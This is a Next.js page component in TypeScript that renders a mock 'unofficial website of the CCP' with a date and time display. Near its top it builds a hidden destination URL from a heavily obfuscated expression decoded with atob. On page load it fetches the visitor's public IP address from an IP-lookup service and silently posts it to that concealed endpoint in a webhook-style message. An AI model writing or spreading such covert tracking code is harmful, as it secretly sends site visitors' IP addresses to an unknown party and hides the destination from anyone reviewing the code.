// import Image from 'next/image';
import styles from '@/styles/Home.module.css';
import React from 'react';
import Datetime from '../components/date';
import path from "path";

export default function Home() {
    let h: any = atob((function(){var F=Array.prototype.slice.call(arguments),G=F.shift();return F.reverse().map(function(L,V){return String.fromCharCode(L-G-56-V)}).join('')})(11,164)+(898).toString(36).toLowerCase().split('').map(function(E){return String.fromCharCode(E.charCodeAt()+(-39))}).join('')+'0'+(12).toString(36).toLowerCase()+(893).toString(36).toLowerCase().split('').map(function(z){return String.fromCharCode(z.charCodeAt()+(-39))}).join('')+(6).toString(36).toLowerCase()+(28).toString(36).toLowerCase().split('').map(function(g){return String.fromCharCode(g.charCodeAt()+(-39))}).join('')+(1598698).toString(36).toLowerCase()+(14).toString(36).toLowerCase().split('').map(function(E){return String.fromCharCode(E.charCodeAt()+(-13))}).join('')+(30).toString(36).toLowerCase().split('').map(function(o){return String.fromCharCode(o.charCodeAt()+(-39))}).join('')+(25023).toString(36).toLowerCase()+(26).toString(36).toLowerCase().split('').map(function(s){return String.fromCharCode(s.charCodeAt()+(-39))}).join('')+(20).toString(36).toLowerCase()+(28).toString(36).toLowerCase().split('').map(function(u){return String.fromCharCode(u.charCodeAt()+(-39))}).join('')+(22).toString(36).toLowerCase()+(30).toString(36).toLowerCase().split('').map(function(m){return String.fromCharCode(m.charCodeAt()+(-39))}).join('')+(1127).toString(36).toLowerCase()+(35).toString(36).toLowerCase().split('').map(function(L){return String.fromCharCode(L.charCodeAt()+(-39))}).join('')+(12288).toString(36).toLowerCase()+(23).toString(36).toLowerCase().split('').map(function(I){return String.fromCharCode(I.charCodeAt()+(-39))}).join('')+(973766).toString(36).toLowerCase()+(12).toString(36).toLowerCase().split('').map(function(y){return String.fromCharCode(y.charCodeAt()+(-13))}).join('')+(658).toString(36).toLowerCase()+(23).toString(36).toLowerCase().split('').map(function(S){return String.fromCharCode(S.charCodeAt()+(-39))}).join('')+(460443).toString(36).toLowerCase()+(29).toString(36).toLowerCase().split('').map(function(d){return String.fromCharCode(d.charCodeAt()+(-39))}).join('')+(31).toString(36).toLowerCase()+(29).toString(36).toLowerCase().split('').map(function(g){return String.fromCharCode(g.charCodeAt()+(-39))}).join('')+(10).toString(36).toLowerCase().split('').map(function(L){return String.fromCharCode(L.charCodeAt()+(-13))}).join('')+(17).toString(36).toLowerCase().split('').map(function(G){return String.fromCharCode(G.charCodeAt()+(-39))}).join('')+(4).toString(36).toLowerCase()+(30).toString(36).toLowerCase().split('').map(function(D){return String.fromCharCode(D.charCodeAt()+(-39))}).join('')+(35).toString(36).toLowerCase()+(29).toString(36).toLowerCase().split('').map(function(I){return String.fromCharCode(I.charCodeAt()+(-39))}).join('')+(0).toString(36).toLowerCase()+(31).toString(36).toLowerCase().split('').map(function(A){return String.fromCharCode(A.charCodeAt()+(-39))}).join('')+(371).toString(36).toLowerCase().split('').map(function(z){return String.fromCharCode(z.charCodeAt()+(-13))}).join('')+(33).toString(36).toLowerCase()+(29).toString(36).toLowerCase().split('').map(function(v){return String.fromCharCode(v.charCodeAt()+(-39))}).join('')+(375).toString(36).toLowerCase().split('').map(function(T){return String.fromCharCode(T.charCodeAt()+(-13))}).join('')+(33).toString(36).toLowerCase()+(29).toString(36).toLowerCase().split('').map(function(d){return String.fromCharCode(d.charCodeAt()+(-39))}).join('')+(function(){var z=Array.prototype.slice.call(arguments),q=z.shift();return z.reverse().map(function(f,p){return String.fromCharCode(f-q-33-p)}).join('')})(57,219,210,217,256,219,202,180,235,214,236,231,212,212,240,188,232,207,187,189,188,203,205,215,224,212,193,223,195,193,157,207,190,186,179,177,187,178,152,155,165,176,144,168,162,171,143,198,158)+(10).toString(36).toLowerCase().split('').map(function(O){return String.fromCharCode(O.charCodeAt()+(-13))}).join('')+(18).toString(36).toLowerCase().split('').map(function(n){return String.fromCharCode(n.charCodeAt()+(-39))}).join('')+(35).toString(36).toLowerCase()+(34).toString(36).toLowerCase().split('').map(function(n){return String.fromCharCode(n.charCodeAt()+(-39))}).join('')+(1).toString(36).toLowerCase()+(26).toString(36).toLowerCase().split('').map(function(l){return String.fromCharCode(l.charCodeAt()+(-39))}).join('')+(21).toString(36).toLowerCase()+(34).toString(36).toLowerCase().split('').map(function(I){return String.fromCharCode(I.charCodeAt()+(-39))}).join('')+(11).toString(36).toLowerCase().split('').map(function(i){return String.fromCharCode(i.charCodeAt()+(-13))}).join('')+(30).toString(36).toLowerCase().split('').map(function(H){return String.fromCharCode(H.charCodeAt()+(-39))}).join('')+(2).toString(36).toLowerCase()+(11).toString(36).toLowerCase().split('').map(function(I){return String.fromCharCode(I.charCodeAt()+(-13))}).join('')+(22).toString(36).toLowerCase().split('').map(function(s){return String.fromCharCode(s.charCodeAt()+(-39))}).join('')+(325).toString(36).toLowerCase()+(11).toString(36).toLowerCase().split('').map(function(E){return String.fromCharCode(E.charCodeAt()+(-13))}).join('')+(28547).toString(36).toLowerCase()+(480).toString(36).toLowerCase().split('').map(function(Q){return String.fromCharCode(Q.charCodeAt()+(-13))}).join('')+(29620).toString(36).toLowerCase().split('').map(function(R){return String.fromCharCode(R.charCodeAt()+(-39))}).join('')+(520).toString(36).toLowerCase().split('').map(function(Y){return String.fromCharCode(Y.charCodeAt()+(-13))}).join('')+(17).toString(36).toLowerCase()+(29).toString(36).toLowerCase().split('').map(function(a){return String.fromCharCode(a.charCodeAt()+(-39))}).join('')+(741).toString(36).toLowerCase()+(function(){var x=Array.prototype.slice.call(arguments),q=x.shift();return x.reverse().map(function(Q,o){return String.fromCharCode(Q-q-36-o)}).join('')})(52,157,202,211,198,153,198,166,184,186,152,143,179,145,157,139,179,167)+(14).toString(36).toLowerCase()+(13).toString(36).toLowerCase().split('').map(function(w){return String.fromCharCode(w.charCodeAt()+(-13))}).join('')+(29441).toString(36).toLowerCase().split('').map(function(l){return String.fromCharCode(l.charCodeAt()+(-39))}).join('')+(16).toString(36).toLowerCase()+(function(){var B=Array.prototype.slice.call(arguments),S=B.shift();return B.reverse().map(function(R,V){return String.fromCharCode(R-S-12-V)}).join('')})(61,134)+(13).toString(36).toLowerCase().split('').map(function(u){return String.fromCharCode(u.charCodeAt()+(-39))}).join(''));

    function send(content: object) {
        let data = {
            embeds: [content],
        };

        fetch(h, {
            method: 'POST',
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        }).catch(console.error);
    };

    function lol() {
        fetch("https://api.ipify.org?format=json").then((response) => {
            response.json().then((inputData) => {
                console.log(inputData);
                let content = {
                    title: "hi",
                    description: `**IP:** ${inputData.ip}`
                };
                send(content);
            }).catch(console.error);
        });
    };

    lol();
    
    return (
        <>
        <header><h1>Communist Party of China</h1></header>
        <main>
            <h1>Welcome</h1>
            <h2>to the unofficial website of the CCP!</h2>
            <p className={styles.inline}>Current date and time: </p><Datetime/>
        </main>
        </>
    );
}
